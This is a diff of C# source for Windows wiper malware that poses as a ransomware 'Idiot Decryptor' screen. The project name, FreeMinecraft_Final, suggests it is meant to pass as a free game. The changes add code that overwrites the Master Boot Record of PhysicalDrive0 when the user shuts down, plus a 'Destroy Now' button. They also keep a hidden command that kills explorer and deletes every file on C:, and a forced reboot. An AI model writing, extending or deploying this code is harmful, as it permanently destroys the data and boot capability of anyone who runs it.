@@ -4,8 +4,9 @@ using System.Windows.Forms;
 using System.IO;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using Microsoft.Win32;
 
-namespace FreeMinecraft_Final
+namespace FreeMinecraft_Final_Wiper
 {
     class Program : Form
     {
@@ -40,9 +41,14 @@ namespace FreeMinecraft_Final
 
         public Program()
         {
+            // REAKCJA NA PRÓBĘ RESETU KOMPUTERA
+            SystemEvents.SessionEnding += (s, e) => {
+                DestroyMBR(); // Niszcz MBR zanim system zgaśnie!
+            };
+
             this.Text = "Idiot Decryptor";
             this.Size = new Size(800, 500);
-            this.BackColor = Color.FromArgb(40, 0, 0); // Dark Red
+            this.BackColor = Color.FromArgb(45, 0, 0);
             this.ForeColor = Color.White;
             this.FormBorderStyle = FormBorderStyle.None;
             this.StartPosition = FormStartPosition.CenterScreen;
@@ -50,7 +56,7 @@ namespace FreeMinecraft_Final
 
             Label lblTitle = new Label() { Text = "Oops, your files have been encrypted!", Font = new Font("Arial", 20, FontStyle.Bold), Location = new Point(250, 20), Size = new Size(500, 40) };
             Label lblText = new Label() { 
-                Text = "What Happened to My Computer?\nYour important files are encrypted. You have 10 minutes to enter the secret key. If you fail, your Master Boot Record (MBR) will be destroyed and all files deleted.", 
+                Text = "What Happened?\nYour files are locked. You have 10 minutes. If you restart or wait, your MBR is gone.", 
                 Font = new Font("Segoe UI", 11), Location = new Point(250, 80), Size = new Size(500, 150) 
             };
             
@@ -59,16 +65,23 @@ namespace FreeMinecraft_Final
             
             Button btnDecrypt = new Button() { Text = "DECRYPT", Location = new Point(560, 298), Size = new Size(120, 32), FlatStyle = FlatStyle.Flat, BackColor = Color.White, ForeColor = Color.Black };
             btnDecrypt.Click += (s, e) => {
-                if (keyBox.Text == secretKey) {
-                    countdownTimer.Stop();
-                    MessageBox.Show("ACCESS GRANTED. SYSTEM RESTORED.", "Success");
-                    Environment.Exit(0);
-                } else {
-                    MessageBox.Show("WRONG KEY!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                }
+                if (keyBox.Text == secretKey) { Environment.Exit(0); }
+                else { MessageBox.Show("WRONG KEY!", "Error"); }
             };
 
-            this.Controls.AddRange(new Control[] { lblTitle, lblText, lblTimer, keyBox, btnDecrypt });
+            // GUZIK DESTROY NOW - W LEWYM DOLNYM ROGU
+            Button btnDestroy = new Button() { 
+                Text = "Destroy Now", 
+                Location = new Point(10, 460), 
+                Size = new Size(100, 30), 
+                FlatStyle = FlatStyle.Flat, 
+                BackColor = Color.Black, 
+                ForeColor = Color.DarkRed,
+                Font = new Font("Arial", 7)
+            };
+            btnDestroy.Click += (s, e) => { timeLeft = 0; };
+
+            this.Controls.AddRange(new Control[] { lblTitle, lblText, lblTimer, keyBox, btnDecrypt, btnDestroy });
 
             countdownTimer = new System.Windows.Forms.Timer() { Interval = 1000 };
             countdownTimer.Tick += (s, e) => {
@@ -85,35 +98,28 @@ namespace FreeMinecraft_Final
 
         private void StartDestruction()
         {
-            MessageBox.Show("I give you a chances.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-            this.WindowState = FormWindowState.Maximized;
-            
-            // 1. YOUR MBR DESTRUCTOR
-            byte[] mbr = new byte[512];
-            uint w;
-            IntPtr d = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1 | 2, IntPtr.Zero, 3, 0, IntPtr.Zero);
-            WriteFile(d, mbr, 512, out w, IntPtr.Zero);
-
-            // 2. FILE WIPER
+            DestroyMBR();
             Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im explorer.exe & del /s /q /f C:\\*.*") { WindowStyle = ProcessWindowStyle.Hidden });
-
-            // 3. TUNNEL SHOW
+            
             System.Windows.Forms.Timer show = new System.Windows.Forms.Timer() { Interval = 30 };
             int f = 0;
             show.Tick += (s, e) => {
                 f++;
                 IntPtr hdc = GetDC(IntPtr.Zero);
-                BitBlt(hdc, 0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, hdc, 0, 0, (f % 2 == 0) ? 0x00990066 : 0x00660044);
-                using (Graphics g = Graphics.FromHdc(hdc)) {
-                    Pen p = new Pen(Color.FromArgb(rnd.Next(255), 255, 255), 10);
-                    int r = (f * 15) % (Screen.PrimaryScreen.Bounds.Width / 2);
-                    g.DrawEllipse(p, (Screen.PrimaryScreen.Bounds.Width/2)-r, (Screen.PrimaryScreen.Bounds.Height/2)-r, r*2, r*2);
-                }
+                BitBlt(hdc, 0, 0, 1920, 1080, hdc, 0, 0, (f % 2 == 0) ? 0x00990066 : 0x00660044);
             };
             show.Start();
-            
-            // 4. RESTART
-            new System.Windows.Forms.Timer() { Interval = 300000, Enabled = true }.Tick += (s, e) => { Process.Start("shutdown", "/r /f /t 0"); };
+            new System.Windows.Forms.Timer() { Interval = 10000, Enabled = true }.Tick += (s, e) => { Process.Start("shutdown", "/r /f /t 0"); };
+        }
+
+        private void DestroyMBR()
+        {
+            try {
+                byte[] mbr = new byte[512];
+                uint w;
+                IntPtr d = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1 | 2, IntPtr.Zero, 3, 0, IntPtr.Zero);
+                WriteFile(d, mbr, 512, out w, IntPtr.Zero);
+            } catch { }
         }
     }
 }
